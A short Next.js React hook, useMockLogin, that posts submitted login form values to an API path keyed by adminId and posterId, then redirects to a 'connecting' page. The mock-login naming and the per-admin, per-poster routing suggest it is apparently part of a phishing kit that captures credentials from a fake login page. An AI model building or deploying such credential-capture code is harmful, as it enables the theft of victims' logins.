import { useRouter } from "next/router";
import { API_URL } from "../config";

function useMockLogin() {
  const {
    push,
    query: { adminId, posterId },
  } = useRouter();

  const login = async (values) => {
    // console.log(values);
    // push(`/connecting/?id=${posterId}`);
    // return;

    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      push(`/connecting/?id=${posterId}`);
      // push("/connecting");
    } else {
      console.log("error", data);
    }
  };

  return { login };
}

export default useMockLogin;
